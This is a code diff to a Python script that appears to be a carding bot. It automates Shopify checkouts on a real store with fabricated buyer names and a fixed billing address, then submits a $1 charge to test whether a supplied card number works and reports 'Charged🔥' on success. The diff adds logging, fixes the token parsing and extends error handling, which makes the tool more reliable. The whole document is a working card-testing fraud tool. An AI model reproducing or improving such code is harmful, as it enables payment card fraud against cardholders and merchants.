@@ -9,7 +9,7 @@ import random
 import logging
 
 # Set up logging
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 def find_between(s, first, last):
@@ -33,7 +33,7 @@ def parse_card(card_input: str):
         return None, None, None, None
 
 # Sample data
-emails = ["nicochan275@gmail.com"]  # Add more emails as needed
+emails = ["nicochan275@gmail.com"]
 first_names = ["John", "Emily", "Alex", "Nico", "Tom", "Sarah", "Liam"]
 last_names = ["Smith", "Johnson", "Miller", "Brown", "Davis", "Wilson", "Moore"]
 
@@ -65,9 +65,11 @@ async def sh(message):
         ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
 
     user_agent = ua.random
+    logger.info(f"Selected user agent: {user_agent}")
     remail = random.choice(emails)
     rfirst = random.choice(first_names)
     rlast = random.choice(last_names)
+    logger.info(f"Selected buyer info: email={remail}, first={rfirst}, last={rlast}")
 
     async with aiohttp.ClientSession() as r:
         # BIN Lookup
@@ -83,7 +85,9 @@ async def sh(message):
                     country = z['country_name']
                     flag = z['country_flag']
                     currency = z['country_currencies'][0]
+                    logger.info(f"BIN Lookup: {bin}, {bank}, {brand}, {type}, {level}, {country}, {currency}")
                 else:
+                    logger.error(f"BIN Lookup failed: Status {res.status}")
                     return "BIN Lookup failed: Invalid response"
         except Exception as e:
             logger.error(f"BIN Lookup failed: {str(e)}")
@@ -111,7 +115,9 @@ async def sh(message):
         try:
             async with r.post(url, headers=headers, data=data) as response:
                 if response.status != 200:
+                    logger.error(f"Add to cart failed: Status {response.status}")
                     return "Failed to add to cart"
+                logger.info("Successfully added to cart")
         except Exception as e:
             logger.error(f"Error adding to cart: {str(e)}")
             return "Failed to add to cart"
@@ -129,6 +135,7 @@ async def sh(message):
                 raw = await response.text()
                 res_json = json.loads(raw)
                 tok = res_json['token']
+                logger.info(f"Cart token: {tok}")
         except Exception as e:
             logger.error(f"Error getting cart token: {str(e)}")
             return "Failed to get cart token"
@@ -149,10 +156,14 @@ async def sh(message):
         try:
             async with r.post('https://www.buildingnewfoundations.com/cart', headers=headers, data=data, allow_redirects=True) as response:
                 text = await response.text()
-                x = find_between(text, 'serialized-session-token" content="&quot;', '&quot;"')
-                queue_token = find_between(text, '&quot;queueToken&quot;:&quot;', '&quot;')
-                stableid = find_between(text, 'stableId&quot;:&quot;', '&quot;')
-                paymentmethodidentifier = find_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
+                x = find_between(text, 'serialized-session-token" content=""', '""')
+                queue_token = find_between(text, '"queueToken":"', '"')
+                stableid = find_between(text, 'stableId":"', '"')
+                paymentmethodidentifier = find_between(text, 'paymentMethodIdentifier":"', '"')
+                logger.info(f"Checkout values: session_token={x}, queue_token={queue_token}, stableid={stableid}, paymentmethodidentifier={paymentmethodidentifier}")
+                if not all([x, queue_token, stableid, paymentmethodidentifier]):
+                    logger.error("One or more checkout values are missing")
+                    return "Failed to initiate checkout: Missing values"
         except Exception as e:
             logger.error(f"Error initiating checkout: {str(e)}")
             return "Failed to initiate checkout"
@@ -178,6 +189,7 @@ async def sh(message):
         try:
             async with r.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data) as response:
                 sid = (await response.json())['id']
+                logger.info(f"Payment session ID: {sid}")
         except Exception as e:
             logger.error(f"Error creating payment session: {str(e)}")
             return "Failed to create payment session"
@@ -209,7 +221,7 @@ async def sh(message):
                     },
                     'payment': {
                         'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': paymentmethodidentifier, 'sessionId': sid}}, 'amount': {'value': {'amount': '1', 'currencyCode': 'USD'}}}],
-                        'billingAddress': {'streetAddress': {'address1': '127 Allen st', 'city': 'New York', 'countryCode': 'US', 'postalCode': '10080', 'firstName': rfirst, 'lastName': rlast}}
+                        'billingAddress': {'streetAddress': {'address1': '127 Allen st', 'city': 'New York', 'countryCode': 'US', 'postalCode': '10002', 'firstName': rfirst, 'lastName': rlast}}
                     },
                     'buyerIdentity': {'email': remail, 'customer': {'presentmentCurrency': 'USD', 'countryCode': 'US'}}
                 },
@@ -219,11 +231,26 @@ async def sh(message):
         }
         try:
             async with r.post('https://www.buildingnewfoundations.com/checkouts/unstable/graphql', params=params, headers=headers, json=json_data) as response:
-                res_json = json.loads(await response.text())
-                rid = res_json['data']['submitForCompletion']['receipt']['id']
+                text = await response.text()
+                logger.info(f"SubmitForCompletion response: {text}")
+                res_json = json.loads(text)
+                if 'errors' in res_json:
+                    logger.error(f"GraphQL errors: {res_json['errors']}")
+                    return f"Failed to submit for completion: GraphQL errors - {res_json['errors']}"
+                elif 'data' in res_json:
+                    submit_result = res_json['data']['submitForCompletion']
+                    if 'receipt' in submit_result:
+                        rid = submit_result['receipt']['id']
+                        logger.info(f"Successfully submitted for completion, receipt ID: {rid}")
+                    else:
+                        logger.error(f"SubmitForCompletion failed: {submit_result}")
+                        return f"Failed to submit for completion: {submit_result.get('reason', 'No receipt')}"
+                else:
+                    logger.error("Unexpected response format")
+                    return "Failed to submit for completion: Unexpected response format"
         except Exception as e:
             logger.error(f"Error submitting for completion: {str(e)}")
-            return "Failed to submit for completion"
+            return f"Failed to submit for completion: {str(e)}"
 
         # Step 6: Poll for receipt
         headers = {
@@ -244,6 +271,7 @@ async def sh(message):
         try:
             async with r.post('https://www.buildingnewfoundations.com/checkouts/unstable/graphql', params=params, headers=headers, json=json_data) as response:
                 text = await response.text()
+                logger.info(f"PollForReceipt response: {text}")
                 if "thank" in text.lower():
                     return f"""Card: {full_card}
 Status: Charged🔥
